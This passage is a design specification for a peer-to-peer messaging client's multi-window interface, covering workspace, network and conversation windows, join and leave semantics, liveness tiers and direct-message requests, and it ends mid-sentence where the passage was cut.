# Interface

**Document status:** v0.34 — §1.11 gains the door macOS actually uses: the **Dock icon**.
`applicationShouldHandleReopen` was unhandled, so on macOS a member who closed the window had
the menu bar extra and nothing else, and the gesture everybody tries first did nothing — the
same shape as `v0.13.2`'s defect, a documented way back that does not open. Raised only when
nothing is showing, which is AppKit's own convention. Previously v0.33 — §1.5 gains a third rule, from the first field test of this
design: **the command that opens a window must be `async`**. `v0.13.2` opened the network
window from a synchronous one, and on Windows that is the message-loop thread — a blank white
window that could not be closed, and a tray whose quit did nothing, from one stuck thread. It
is a platform rule and lives in `05` §1; it is named here because this section is what requires
windows to be made at runtime in the first place. Previously v0.32 — §§1.6–1.8 are **built**: conversation windows, starting one from a
roster, and answering a request that arrived. Three things building it settled. Per-message
delivery state is **not** built and is owed, because `03` §4.5's three states need evidence the
shell does not collect — a window drawing two ticks it had not earned would be making the exact
claim §1.8 refuses to make about a decline. A conversation window knows which conversation it is
from **its address**, which is what lets several exist at once where the shell's single "open
network" cannot answer. And the workspace window was **drawn once and then went stale** — no
poll, no subscription — so a network founded in it said *not keyed in yet* indefinitely and an
arriving request appeared on whatever draw happened next; it now takes events for what the node
announces and a five-second poll for what nothing does. Two further defects came from a startup
path older than this section: it marked a network as *in view* with no window showing it, and it
served nothing at all unless there was exactly one network. Previously v0.31 — §1 gains §§1.1–1.14: **the workspace is a window**, a network is drawn in a second window reused as you switch, and each conversation gets a small window of its own. This is where direct messages live and where networks are chosen and managed, and the two are one surface because a conversation *is* a network (D10). The rule deciding what goes where is `05` §3.1's rather than a layout — an act about one network belongs to that network's window, an act about the set of them to the workspace's — which is also the test for whatever is proposed next, and which turns out to sort §4.2's settings groups by window as well as by what a click costs. §7's first question therefore keeps its answer rather than overturning it: nothing new earns permanent space *in the frame*. §7's third closes with §1.3, which turned up an honesty rule nobody had written down — a **cold** network is polled, so a zero on its row means *nothing as of the last poll* and the row says when it looked. Also settled: create and join become sheets rather than permanent furniture; reuse must clear the native title with the content or D36's spoof returns as a temporal one; a window is a view, so closing one neither sets a network aside nor stops its node, and the application keeps running until somebody quits — said once, the first time, rather than never or every time; the lock reaches every window and the tray may show nothing a locked screen would not; there is no directory and a name-shaped search box would be a phishing surface; the list may not reorder itself, because a row moving under a pointer is how a message reaches the wrong network; a decline is invisible to the sender and both sides are told so; and D39's *this machine has nowhere to meet them* is finally said where somebody reads it. Recorded as D40. Previously v0.30 — §4.1's opening paragraph is corrected to the vocabulary presence was actually built with, `here | idle | busy | invisible`. It had gone on quoting `01` §9's pre-build states — `online | idle | dnd | invisible` — four lines above its own rule that `online` is a word this interface may not use, and `01` §9 had recorded the correction on 2026-09-08 while this section, rewritten around the same work, kept the sentence it had just made false. The same paragraph's *never stored* is narrowed to the beats, since the invisible **choice** is deliberately persisted and that now says so where somebody reads it. Previously v0.29 — §2's policy is corrected in the direction that matters: **everything joined is warm unless the member sets it aside**, and **cold is polled rather than switched off**. The first pass ran one server plus every conversation, which makes eleven of a member's twelve networks silently unreachable — and read cold as "no node, ever", when the table has always given it a wake latency of the poll interval. That second error reaches other people: a network with no node serves nothing, so a machine quietly stops holding up replica duty it had taken. §7's fourth question is closed by removing it — warm is the default and *set aside* is explicit, so there is no recency rule to infer. Previously v0.28 — §2's **liveness tiers are built** (`kols_node::nodes`), which had been unwritten policy since that section was drafted and was the thing actually blocking direct messages: the shell ran one node, for the network in view, so a conversation nobody had open could neither receive a message nor be reached to deliver one. Hot and warm are both running nodes — the distinction §2 drew was against a held connection, not against a process — and a conversation is warm whenever the application runs. A server out of view is cold rather than warm, which is the conservative half of §7's fourth question and leaves it open. Previously v0.27 — §3 records D39: a conversation **borrows** the shared network's relay and never designates it, on a permission recomputed each time and requiring both parties to still be members. The section described the fallback without saying what it does to the conversation's own policy, and the obvious reading — designate it — writes state that outlives its reason with nothing able to remove it. The cost is now stated as the limit it is, along with what the interface owes when a conversation goes quiet for that reason rather than because nobody is talking. Previously v0.26 — §3 takes the statement it was owed and never got: this client does not dial what mDNS finds, because a node that did would make two of a member's identities correlatable by anyone watching the LAN — D29's concern with no relay involved. `00` §6 owns the decision; §3 is where the interface set carries D29, so its absence here left the argument half-stated. Also corrects §3's claim that `Discovery::Off` for a conversation is still owed by the client: it was built on 2026-09-08. Previously v0.25 — §4.4 gains the requirement that decides whether the rest is worth having: the two-second tick may not grow **at all**, which is the storage ceiling's argument about the other resource. Paging made a page cost a page and left the tick linear, and *measured flat* turned out not to be *bounded* — five things on that path answered "has anything changed" by examining everything. One primitive replaces all five, a file whose length is the signal, and the guarantee is now a count of work asserted equal at two hundred records and at three thousand rather than a duration that looked flat. Previously v0.24 — §4.4 is built: paging, the three top-of-list states, the cursor, and per-channel history. Building it settled three more — a ceiling belongs where untrusted input arrives rather than in the store, restoring the scroll position is a fix that predates paging, and the first-sight rule splits on the previously-drawn tail rather than on the gesture alone, or a message arriving during a reach is filed as seen and never marked. Previously v0.23 — §4.4 is new and settles what `05` §5 built and left switched off: paging. Two kinds of *older* that must never share a control, a loaded range that only grows, a cursor that is the merge-order key rather than a clock reading — the `Hlc` the command has carried since it was written silently drops a message when a page boundary falls between two records sharing a reading — and §4.3's own first-sight rule applied one level down, so scrolling back marks nothing. It also takes a fix it cannot inherit: `history_incomplete` is node-wide and would contradict the local boundary sitting above it, so a segment records its channel. Previously v0.22 — §2's behaviour set is built and the section stops claiming the liveness tiers are: a node is constructed `Discovery::Off` for a conversation and `Discovery::Full` for a server, read from replayed policy, and hot/warm/cold remains unwritten policy. It also records the one window E10 has to close — a joiner cannot know the profile before it syncs, so the DM flow must supply it. Previously v0.21 — §3's shared-relay notice is built, and the section records what building it settled: a relay is compared by peer id and never by address, since one relay answers at several and a string comparison reports no overlap in exactly the case D29 is about; there are two designations rather than one, the second being the network-creation form; and joining is deliberately not covered, because a joiner adopts what an invite carried rather than choosing it. Previously v0.20 — §4.1's presence is built, and the section is rewritten around what that cost: two marks that may never stand in for each other, an absence case that stays deliberately silent, and invisible as *publishes nothing* rather than *publishes "invisible"*. The control sits in the roster rather than settings, which is an argued exception to §4.2's grouping. Previously v0.19 — §4.2 gains the rule a stale contribution panel cost: copy that describes an unbuilt mechanism rots into a false claim about what the software does, and is guarded by a check that reads the live document rather than by remembering to revisit it. Previously v0.18 — §4.2 gains a third settings group, *this machine, here*, for contribution: local and revocable like *mine*, and broadcast, which the *mine* heading explicitly says its contents are not. Previously v0.17 — §1 gains the third landing a join can have: the request reached the issuer and nothing came back, which is not a refusal and used to be reported as one — costing somebody a use-limited invite on a retry into a network that already held them. Membership now comes from replay rather than from what the handshake said, and the interface tells *not admitted* apart from *admitted and not yet keyed*. Previously v0.16 — §3 revises what the client does about a relay shared between two networks: it warns and never refuses, since a refusal is unenforceable anyway and would block a member legitimately relaying on their own LAN for two of their own networks. Previously v0.15 — §2 records that the picker's *forget* becomes *leave* on the open network, since publishing a departure needs a running node and only the open one has one; and that what it reports afterwards is how many members could have heard rather than how many did. Previously v0.14 — §5.1 records what the first working drag found: a drag needs a target for every destination rather than for every thing, and two of four were unreachable — the end of a list, and the top level once every channel was in a folder. Previously v0.13 — §5.1 gains the rule reordering cost: a capability whose only route is one nobody can verify has no route. Drag-and-drop never worked because Tauri's native drag handler took it first, and channels keep move up and move down beside the fixed drag. Previously v0.12 — the row handle is removed at the tester's request, one way to a menu being enough; §5.1 keeps the two sizing rules it cost, which were never about it. Previously v0.11 — §5.1 gains the rule the sidebar bug actually needed: draw an icon rather than typing one, and take a control beside shrinkable text out of flow, because correct arithmetic is not the same as no arithmetic. Previously v0.10 — §4.3 gains the two ways a mark ends, and that it never marks your own; §5.1 gains the flex sizing rule that turned a sidebar into columns of one letter on Windows and not on macOS. Previously v0.9 — §4.1 says where the roster went and what the one number left on screen is for; §4.2 records settings becoming a screen rather than a layer, and the rule that decides which surface a thing gets; §4.3 is new and separates *where something arrived* from *what you have not seen*, which cannot be derived from it because a message is ordered by its author's clock rather than by its arrival. §7.1 and §7.3 narrowed rather than closed. Previously v0.8 — §4.2's Network section takes admission mode, the abuse limits and the retention windows, and says the three things a number on screen does not carry. Previously v0.7 — §4.2's settings sections are built, and it says what shape they took and which of them is a panel over a feature that does not exist yet; §5 gains the line between asking *whether* and asking *what*, which is what decides whether a dialog may live in the document a theme can reach. Previously v0.6 — §4.1 says plainly that presence is unbuilt, why it is last, and what the window shows instead; that was being carried in a status file. Previously v0.5 — §4.2 fixes what settings is and how it is divided, §6.4 and §6.5 settle reset and the two things that must leave the document before a theme can reach them (D36, D37). Theming remains designed and unbuilt. Previously v0.4 — D29 (a relay is never shared between networks) and what it does and does not mean for §3's direct-message bootstrap;  an interface now exists and is a first pass, not a settled one: it
creates and joins networks, runs a node, renders a channel, brings the next member in, and gates
its chrome on permission. §1's workspace, **both halves of §5**, all three of §4's questions and
most of §7's second are built; §2's tiering and §6's theming are not, and §7's
navigation question stays open by default rather than by decision
**Depends on:** `05` for the crate layout and API boundary; `01` §9 for presence; `03` §4 for
direct messages; App Hosting Spec §1.2 and §3.3 for the sandbox path
**Consumed by:** implementation

---

## 0. What This Document Is For

`05` fixes the *architecture* of the client — crates, the command/event boundary, the sync
engine, the sandbox path — and stops before anything about what the interface looks like or
how it behaves. That gap was real: eight design documents contained two UX commitments
between them, both incidental to sections about something else.

This document covers the interface. It does not restate `05`'s boundary rules; it assumes
them and describes what gets built on top.

**Three constraints from `05` shape everything here, and none are negotiable:**

1. The interface is HTML/CSS/JS in a webview, with Tauri v2 as the shell. App Hosting §1.2
   fixes the eventual sandbox as a webview, so a native GUI means writing the interface
   twice.
2. `kols-ui` holds no keys, no sockets and no files. Everything crosses `kols-api` as
   commands out and events in.
3. The same interface must re-host inside the sandbox against a *narrower* API (`05` §7),
   so it may never assume a capability the sandboxed build cannot refuse.

---

## 1. One Process, Many Networks

A user belongs to several networks and holds several direct-message conversations, and must
move between them without running the application more than once.

**Each network is a separate node, and that is forced rather than chosen.**
`keypair_for(identity)` derives the libp2p keypair from the *per-network* identity, so every
network a user belongs to already has its own peer id. The tempting optimisation — one swarm
multiplexing several networks — would mean one peer id across all of them, which correlates
identities Core §1.2 deliberately keeps unlinkable. **The resource-saving version of this
feature is the one that breaks the security model.** It is named here so that nobody
rediscovers it later as a performance idea.

**A direct message is a network** (`03` §4.3): starting one creates a network with the
sender as sole Founder. So the node count is `servers + conversations`, not `servers`, and a
user who messages thirty people is running thirty-odd nodes. §2 is the answer to that.

**Switching networks clears the screen before it draws, rather than relying on the next draw
to overwrite it.** The header, sidebar and roster are redrawn from the network being opened, so
those were right; the message pane is drawn by opening a *channel*, which a network with none —
every network at the moment it is created — never does. So the previous network's messages and
channel name stayed in the document, which looks exactly like content crossing between networks
and is not: each is its own store under its own directory, and a new one holds a genesis entry
and no records at all. The alarming reading and the true one are indistinguishable from outside
the code, which is the whole reason this is a clear rather than a redraw.

**So the client holds a workspace rather than a store.** A directory of networks, each its own
store, listed and chosen before anything else can happen — which also means *creating* one is
something the interface does rather than something a terminal must have done first. That was
the shape of the gap: creating a network lived in `kols init`, so a window could not offer it
without a second copy of the genesis requirements, and each of those is silent when missed —
the network looks fine until the first post is refused by its own author's node. One path, two
front ends.

**A network can be left, and the button says which of the two acts it is about to do.** It
used to say only *forget*, because forgetting was all it could do: nothing in the log expressed
resignation, so dropping this installation's store was the whole of it and the log every other
member replayed was untouched. Core §2.5.1 changed that, and `02` §6.5 carries what the client
does with it.

**One button, two words, decided by whether a node is running.** Leaving means publishing a
departure, publishing needs a node, and only the network that is *open* has one — so the button
reads **leave** there and **forget** everywhere else. That is not a cosmetic difference and the
confirmation spells it out: one tells the network and the other cannot, and a person choosing
between them should not have to infer which they are getting from whether they happened to open
it first.

**The seed goes either way**, and the seed is the identity (`02` §6.3), so a later join arrives
as a stranger rather than as the member the log already names. The confirmation says that, and
says the lighter thing when there was never a key to lose, because a network that was never
joined costs nothing to drop and most of the uses of this will be exactly that.

**Afterwards it reports who could have heard, and never who did.** Gossip acknowledges nothing.
So the line under the picker counts the members this node was connected to when the departure
went out, and where that count is zero it says the network was not told — in the same place, in
a different colour, because those are two outcomes and rendering them identically is the failure
`02` §6.5 is written against. Zero is worth saying plainly rather than softening: the seed that
signed the entry is gone, so it cannot be sent again.

**Having no network open is where somebody starts, not a failure.** The interface opens on a
picker; with exactly one network it opens that one, because being asked to choose between one
thing is noise.

**The picker offers joining before creating**, because those are not equally likely. Somebody
opening this client for the first time is usually holding an invite, and has one thing to do
which is not founding a network of their own. And a joiner who lands in a waiting room has
*succeeded*: under explicit intake an invite buys a connection and an identity and nothing
else until a member admits them (`02` §6.2), so the interface says that rather than showing an
empty network, which is what the same state looks like when nothing explains it.

**A join has three landings, not two, and the third is the one that used to be reported as a
failure** — O21, built 2026-09-07. Admitted and waiting are both successes and were already
handled. The third is *the request reached the issuer and no answer came back*, which is not a
refusal and must never be shown as one, because under auto-admit a network answers by **writing
a governance entry** — so the entry can exist while the reply that would have reported it does
not.

That mattered more than a wrong word. An invite is use-count limited, so somebody told their
join failed retries, spends the invite, and is locked out of a network that has held them as a
member the whole time. The store is therefore kept, the node is started, and the interface says
plainly not to redeem the invite again.

**What settles it is replay, not the handshake.** `00` §2's third principle — authorization is
a computation, never a cached claim — applies to this node's own membership as much as to
anybody else's. The client used to remember what the join handshake said and never revisit it;
it now asks replayed governance whether this identity is a member, so a lost `Admitted` costs a
sync rather than a network.

**The interface therefore distinguishes three states where it had two**, because a node holding
no epoch key is in one of two entirely different places: *nobody has admitted me*, which is
somebody else's move, and *I am a member and not yet keyed in*, which is ordinary and resolves
itself since the node re-asks every thirty seconds (Core §3.5.1 makes a repeat request safe).
Both used to be told to go and find an admin, which sent half of them after a problem that did
not exist.

One distinction the implementation turned on, and it is worth keeping because the obvious
version is wrong: **connecting to something is not reaching the issuer.** An invite carries a
relay circuit, so a joiner routinely connects to a relay whether or not the issuer is behind
it. Treating that as delivery would report a join that reached nobody as one whose answer was
merely lost — telling somebody their join may have worked when nothing on the far side ever
heard of them, which is the opposite of what this is for. The condition is a connection to the
issuer's own peer id. Caught by
`tests/invites.rs::a_join_that_finds_nobody_says_what_it_dialled` rather than by review.

**Honest limit, stated because the interface should not oversell it — and this is the
canonical statement the rest of the set defers to** (`00` §1, `03` §4.2/§4.6/§7, D29).
Unlinkability holds at the *identity* layer. Two of a user's identities connecting from one IP address remain
correlatable by any peer that is in both networks, and by any relay that sees both. The
protocol never claimed otherwise, and the interface must not imply it did.

### 1.1 Three windows, and the rule that decides which

**Decided 2026-09-11.** The workspace is a **window of its own**, and a network is drawn in a
second window beside it rather than underneath it. Conversations get a third, smaller kind.

**§7's first question keeps its answer, which is worth saying plainly: nothing new earns
permanent space in the frame.** Three field tests said no, and this does not overturn them —
it gets out of the frame entirely. The channel rail, the roster dropdown, the door as a sheet
and settings as a screen all stand exactly as they were.

What decides the split is the line `05` §3.1 drew for a different reason: some acts are about
**one network** and cross `kols-api`, and some are about the **workspace above them** and
cannot. That line turns out to be a window boundary.

| Window | Holds | Acts |
|---|---|---|
| **Workspace** | Every network and conversation this installation belongs to; pending requests | Create, join, start a conversation, leave or forget, set aside, and the installation-wide settings |
| **Network** | One `server` network: channels, messages, roster, its own settings | Everything that crosses `kols-api` for that network |
| **Conversation** | One `conversation` network: the person and the messages | Posting, and leaving |

**This is the test for anything proposed later**, which is the point of having a rule rather
than a layout: if an act needs a network to be open, it belongs to that network's window. If it
is about the set of them, or about this installation, it belongs to the workspace's.

**One process, several windows, and that is forced rather than chosen.** `05` §4's store claim
permits exactly one process to run a node for a network, because the MLS group is live state
and two processes would each advance it without seeing the other. So a second launch of the
executable must **raise the windows that already exist** rather than reporting a conflict: the
member did not ask to run two copies, they asked to see the application, and a refusal dialog
answers a question nobody posed.

**Built 2026-09-11, as a claim rather than a lock, and the protocol is an exchange rather than
a read.** It is the node claim's shape one level up — a directory, an owner token, a heartbeat,
a staleness window — so it needs nothing from the desktop, which is the argument against the
obvious alternative: the usual plugin for this registers a D-Bus name on Linux and *panics*
where there is no session bus, which is precisely where the tray this backs up is also absent.

**A heartbeat is not evidence that anybody is answering**, and that is the part worth carrying.
A process killed leaves its last beat behind, fresh for the rest of the staleness window — so a
launch deciding on the beat alone would exit as a second instance with nobody to raise, which
presents as *an application that will not start*. That is the worst failure available here,
because the member's remedy is to try again and trying again is the gesture that keeps failing.
So a launch **asks and waits for the ask to be taken**: a live holder consumes it on its next
beat, a dead one never does, and the launch becomes the application instead. Found by killing
one and relaunching, not by review.

**And the claim is released wherever the nodes are stopped**, for the mirror of the same
reason: an exit does not drop a running task, so a claim left to its staleness window would
make quitting and relaunching within a few seconds look like an application that will not
start.

### 1.2 The workspace window

**A buddy list, not a dashboard**, and the proportion is part of the design rather than a
styling note: it is narrow and tall, it belongs at the edge of a screen next to something else,
and it must be usable at around 300 px wide. §5.1's sizing rules are not optional here —
a percentage width inside a flex row, or an icon typed as a character, are exactly what turned
a 260 px sidebar into columns of one letter, and this window is narrower than that one.

It holds two groups, **networks** and **conversations**, and §1.4 says why they are grouped
rather than merged. It is where somebody starts, and with nothing joined it is the whole of
what the application shows — the picker from §1 above is this window with an empty list, rather
than a separate screen that disappears once you join something. One surface, learned once.

**Creating and joining are actions here, and they open sheets.** They had permanent space on a
page and should not have: they are things somebody does rarely, deliberately, and then leaves.
§5.1 already draws the line they fall on — asking *what* (a name, an invite string, a relay) is
data entry, lives in the document and is themeable; only asking *whether* is native. So a
button opens a sheet, the sheet takes the one thing it needs, and it closes.

**Joining is offered before creating**, for the reason §1 above gives: somebody opening this
client for the first time is usually holding an invite and is not founding anything.

### 1.3 What a row may say, and the claim cold makes easy to get wrong

A row carries three things, each already settled elsewhere in this document:

- **Unread**, on §4.3's terms — arrival-driven, weight for a glance and a number when you look,
  never derived from a read position.
- **Whether this node holds a connection to anybody there**, which is §4.1's dot at network
  scale. It is *not* presence: it says this machine is talking to somebody, which is the state
  that renders identically to "nobody is saying anything" and is the one worth knowing.
- **Its tier** (§2), because §1.10 makes setting a network aside an explicit choice, and a
  choice a member cannot see is one they cannot revise.

**And a fourth claim it must not make.** §2 makes a cold network *polled* rather than switched
off, so a cold row's count is as old as its last poll — up to the interval, ten minutes by
default. **A zero there means "nothing as of the last time this machine asked", not
"nothing".** So a cold row says when it last looked.

This is §4.1's rule about presence applied to a whole network, and it is easier to get wrong
here because a number reads as authoritative where a missing word does not: rendering `0`
beside a cold network asserts the absence of news nobody went and asked for.

**This closes §7's third question, and part of the answer is what does not move.** Activity on
a network nobody is looking at is noticeable because its row carries a count. **A network
window's title keeps carrying only its own network**: D36 made the title the one piece of
native chrome that says which network you are in, and a cross-network total in it blunts
exactly that. The **workspace window's** title may carry a total, because that window is about
the set and names no network. An attention request fires from the window the activity belongs
to when it is open, and from the workspace window when it is not.

### 1.4 Two groups, one list, and the split is not this document's

In the model a conversation **is** a network (D10). This interface must not pretend otherwise:
one workspace, one installation-wide storage ceiling (`05` §5.1), one claim per store, one
liveness policy.

In the surface they read differently, and `03` §4.1's own table already decided how — a
`server` is *a server in the server list*, a `conversation` is *a contact in the friends list*.
A server is a place you go; a conversation is a person you talk to.

So: **two groups in one window, never two windows.** Two would ask a member to manage as two
things what the software manages as one — two places to look for why the disk is full, two
places a network can be set aside from. The groups are labelled, because the difference decides
what is even possible: a conversation has no channels, no roles, no invites and no waiting
room, and somebody expecting those should learn it from a heading rather than from an absence.

### 1.5 The network window is reused, and reuse needs two rules

Clicking a network draws it in the network window that is already open. **A second one is
available and never automatic** — a menu item and a modifier-click — because a member with a
dozen networks did not ask for a dozen windows, and switching that costs a window is the
cumbersome thing wearing a different coat.

Two rules make reuse safe, and both exist because of D36 rather than tidiness.

**A network already open raises its window rather than redrawing another.** Otherwise clicking
around leaves the same network in two windows, and two windows showing one conversation is how
a member loses track of which is current.

**The title and the content change together, or reuse has reinvented the spoof.** D36 keeps the
network out of themeable chrome because a message written into the wrong network is this
application's worst ordinary failure, and a reused window introduces a *temporal* version of
exactly that: click, content redraws, title lags, you type into what you were looking at a
moment ago. §1 above already requires the screen to be cleared before it is drawn rather than
overwritten; **the native title is part of what is cleared.** A window mid-switch shows neither
network rather than one network's name over another's messages.

**And a third rule, from the field: the command that opens it must be `async`.** `v0.13.2`
opened this window from a synchronous one, which on Windows gave a blank white window that
could not be closed and a tray whose quit did nothing — all three because a synchronous
`#[tauri::command]` runs inline in the IPC handler, and on Windows that is the message-loop
thread that WebView2's creation needs pumped. It is a platform rule rather than an interface
one, and it is recorded here as well as in `05` §1 because this section is what asks for a
window to be created at all: **this design requires windows made at runtime, and that requires
them made off the thread that draws them.** `05` §1 has the mechanism, and
`kols-app/tests/window_creation.rs` is the guard.

### 1.6 Conversations open their own small windows

A conversation window is **compact and deliberately unlike a network window**: no channel rail,
no roster dropdown, no settings screen. That is honesty rather than minimalism — a
`conversation` network has exactly one implied channel and no roles (spec 07 §1.2), so a
server-shaped frame would draw furniture that is always empty and imply controls that cannot
exist.

What it does carry is what a conversation actually has:

- The person, named per §1.8's rule, with enough identity beside the name to tell two
  lookalikes apart (spec 07 §8).
- **Delivery state per message** — `03` §4.5's three honest states, *sent*, *delivered* and
  *read*, which must stay three: delivered is provable because the recipient became a holder,
  and read is what their client says and is theirs to withhold.
- §1.9's sentence when the conversation has nowhere to meet.

**Several at once is expected**, which is the shape's whole advantage; they are small, they are
opened from the workspace window, and closing one closes a view and nothing else.

**A group conversation uses the same window with a roster**, because past two people "who is
here" becomes a question again. It is the only thing that grows.

**Built 2026-09-11 — `conversation.html`, and the one thing on that list it does not have.**
The window carries the person with their identity beside the name, the messages, a composer and
§1.9's sentence. **Per-message delivery state is not built**, and the honest version of that is
that `03` §4.5's three states need something the shell has no record of: *delivered* is
provable only because the recipient became a holder, which nothing currently asks, and *read*
is a claim their client makes and may withhold. A window that drew two ticks it had not earned
would be making exactly the claim §1.8 spends its length refusing to make about a decline. It
is owed.

What the window knows about itself comes from **its address** rather than from asking the
shell, which is what makes several at once work: the shell's "open network" is one network, and
these are many. So each window is created at `conversation.html?network=<id>` with a label of
its own — and that label has to be in the capability file, which is the trap this shell has
already paid for once (`kols-app/capabilities/default.json` names `conversation-*`).

**One layout rule earned here, the same shape as §5.1's.** A short conversation drew itself at
the top of the window with the composer a screen below it — correct flex, wrong reading, since
what somebody is looking at is the last thing said and the box they are about to type into. An
auto top margin on the first row rather than `justify-content: flex-end`, which in some engines
makes the overflow above unreachable: scrolling back is the one thing that container may not
lose.

### 1.7 Starting a conversation: there is no directory, and the flow says so

**You may only start one with somebody you already share a network with**, and the request names
their identity *in that network* — spec 07 §6.2's proof binds exactly that pair, and
`dm::start` refuses anybody who is not a current member. So the flow is **pick a network, then
pick a member of it**, and that is the shape of Core §1.2 rather than a limitation of this
screen.

Which makes the **member roster** (§4.1) an entry point as good as the workspace window: from a
roster you are already looking at one person in one network, which is precisely the two things
a request needs.

**A box that takes a name is not offered and could not be.** Names are per network, are not
unique, and are not identifiers (spec 07 §1.7); there is no cross-network directory and there
will not be one (Core §0). A global "add a friend by name" field would be a phishing surface
whose attacker's half is typing — the same reasoning D36 applies to a theme that makes one
network resemble another, arriving through a text field instead.

**Group conversations** are `03` §4.4's: select two or more contacts, start, and behind it a
`conversation`-profile network with every participant a Founder. Two things the interface owes
a member, because the expectation runs the other way in every messenger they have used:

- **Adding somebody to a pairwise conversation is not possible**, so it is not offered. The
  roster of a two-person conversation *is* the conversation.
- **A group started from an existing conversation begins empty.** It is a different network, so
  there is no history to bring. Said before the act rather than discovered after it.

**Built 2026-09-11, and the roster is the only entry point.** A row opens a small menu offering
*message <name>*, which sends the identity — never the name — with the network it was read in.
Your own row offers nothing, because `dm::start` refuses yourself and a control that cannot
work is worse than no control. **Group conversations are not built.**

What the asker is told afterwards is the half of §1.8 that belongs on this side, and it is
deliberately not drawn as a failure: *they will see it when you are both online; there is no
answer to wait for, because a decline is never sent.* The line it goes on had to stop being an
error line to say that — a request sent is the flow working, and colouring it like a refusal
would make it read as broken every time it succeeded.

### 1.8 A request that arrives, and the two things neither side can see

A verified request appears in the workspace window's conversations group as a pending row,
**whether or not the network it arrived through is open** — it came through a shared network and
is about a new one, and a member should not have to guess which network somebody reached them
in.

**There is no unverified state to render**, and its absence is worth stating because it looks
like an omission. spec 07 §6.2 requires the identity link checked *before the request is shown
to anybody*, so a request that did not verify never reaches the disk (`dm::receive`) and never
reaches this list. A *verified* badge would be the interface taking credit for a property it
cannot fail to have; an *unverified* one would label a row that cannot exist.

**A row shows who asked and where they were met**: their display name in the shared network,
beside enough of their identity to tell two lookalikes apart. spec 07 §3.9.1 deliberately does
not fold confusables and §8 makes rendering identity beside a name an obligation — a contact
list is the exact place an impostor name pays off, because it is where somebody decides who
they are talking to.

**Declining is local, and each side is told what the other cannot see.** Nothing is sent: the
carrier acknowledged delivery when the payload arrived (Core §5.1) and there is no
application-level answer, deliberately, since a refusal that distinguished itself would turn
every decline into a disclosure (spec 07 §6.2). So:

- The person declining is told **the sender will not learn this**, because somebody who
  believes a decline is both private and visible has it exactly backwards.
- The person who asked sees **delivered**, and never *waiting for an answer*. A sender cannot
  tell a decline from somebody who has not looked, and a row saying *pending* forever would
  invent the difference.

**Built 2026-09-11**, as three states in one list — somebody who asked, somebody who was asked,
and somebody being talked to. Accepting joins the conversation's network and opens its window in
one gesture; declining asks first, and what it asks is the thing only this side can know. A row
nobody has answered yet cannot be opened, because until it is accepted there is no network on
this side for a window to draw.

**And the defect worth recording is that this window was drawn once and then went stale.** It
had no poll and no subscription: a network founded in it reported *not keyed in yet* for as long
as it stayed open, because the epoch key is written a beat after the node starts and nothing
asked again. A request arriving was the same failure with worse consequences — this section says
a verified request appears in this list, and it appeared on whatever draw happened next, which
might be tomorrow. Fixed with both mechanisms rather than either: the events the node already
emits for what it announces, and a five-second poll for what nothing announces, which is most of
§1.3's row contents. The poll skips its redraw when the answer has not changed, because
rebuilding a row takes it out from under a pointer already on its way to it.

**Two more came out of the same launch**, both from a startup path that predates the workspace
window and had not been re-read since. It **marked a network as in view** with nothing showing
it — so the list drew a row as open and offered *leave* where it meant *forget*, for a network
nobody had opened — and it gave up unless there was **exactly one** network, which quietly meant
a member with two of them unlocked and served neither until they clicked one. §2 makes every
joined network warm whether or not anybody is looking at it, which is the whole reason a
conversation nobody has open can still be reached.

### 1.9 A conversation can stop working, and silence is the wrong way to say so

D39 borrows a conversation's rendezvous from the network it was arranged in, recomputed every
time and never stored, so **a conversation between two people who no longer share a network,
and who cannot reach each other directly, stops working.** §3 states that as the feature's limit
and says the interface owes the sentence; this is where it is owed.

The row and the window both say it, because **a conversation that has silently stopped
connecting and one where nobody is talking render identically**, and only the first is worth
knowing about. What it says is what is true — *this machine has nowhere to meet them: you no
longer share a network* — rather than *offline*, which §4.1 forbids for a person and which is no
more knowable about a pair.

Old messages stay readable throughout, and the interface must not imply otherwise: they are
content on both machines already.

### 1.10 Order is local, the list may not reorder itself, and setting aside lives here

**A member may order the workspace window however they like, and that order is written nowhere
and reaches nobody** — the same shape as the local channel-order override (spec 07 §1.6), for
the same reason: how somebody arranges their own client is not the network's business. The
default is the order things were joined, which is stable and which nothing can dispute.

**What the list must never do is reorder itself in response to activity.** The reason is
specific rather than a preference about motion: networks are the privacy boundary D29 exists to
protect, and the failure that matters here is a message written into the wrong one. A list that
reshuffles between the look and the click causes exactly that — the failure D36 keeps a *theme*
from causing, arriving through movement instead of styling. Unread is shown by weight and a
count; it never moves a row.

**Setting a network aside is a control on the row.** §2 makes warm the default for everything
joined and *set aside* an explicit per-network choice, which left a control this document had
not placed. It belongs where a member is looking at the whole set, because that is the only
place the trade is visible: a network set aside stops costing a connection and starts costing
latency.

**That is an argued exception to §4.2's grouping, and the same one §4.1 makes for presence.** By
that section's rule a tier is local, revocable and observable by other members, so it would file
under *this machine, here*. It sits on the row anyway, for §4.1's reason: settings is a place you
go to finish something and leave, and this is changed in the moment — and the moment is while
you are looking at the list deciding which of these you still care about. Recorded as an
exception rather than done quietly, because two sections disagreeing about where a control goes
is how a third ends up guessing.

What the control says is what §2 decided: set aside means **polled, not off**. A member choosing
it is choosing slower, not absent, and their machine goes on holding up the replica duty it took
(`05` §5.1). Saying *off* would describe a state this client deliberately does not have.

### 1.11 Closing a window is not leaving, and not going offline

**A window is a view.** Closing a network's window does not set it aside, does not stop its
node and does not change anything another member can observe. Coupling the two would reintroduce
precisely the defect `v0.13.0` was cut to fix — a network going quiet because somebody looked
away — and it would do it while looking like a feature.

**So the application keeps running when its last window closes, and quitting is a separate,
explicit act.** `00` §6 already decided the shape of this for logging out: *nobody at my keyboard
can act as me* and *I want to disappear from the network* are different requests, and quitting
the application is how somebody makes the second. Closing a window is neither. And `05` §5.1 has
this machine holding replica duty for other members, so a close that quit would silently drop
duty a member had taken on.

**What this costs is discoverability, and the cost is paid rather than ignored.** Somebody who
closes every window may reasonably believe they have shut the application down. So the **first**
time it happens, the application says it is still running, where it is, and how to quit — once,
not on every close, because a notice that appears every time is one nobody reads, and once per
*installation* rather than per launch, because a notice every morning is the same notice. It
carries the way out beside it, since the moment somebody learns closing is not quitting is the
moment they may want to quit. This is §5.1's storage principle applied to a different resource:
a member who was told and did nothing has made a choice, and one who was never told had it made
for them.

**All of it depends on the tray existing, and that is not a given — found by building it.** A
tray is a desktop service rather than a window: a Linux session with no tray host, or a GNOME
without the extension, has none. So **where a tray icon cannot be built, closing the last
window ends the application**, which is the behaviour before this section and is the honest
one — the alternative is a process a member cannot reach, cannot quit, and was told was fine.
The notice is not shown there either, because it would be describing a tray that is not there.

**The residual case is covered by §1.1's second door, built 2026-09-11.** A tray icon can be
*built successfully and never displayed* — the reference container does exactly that, having
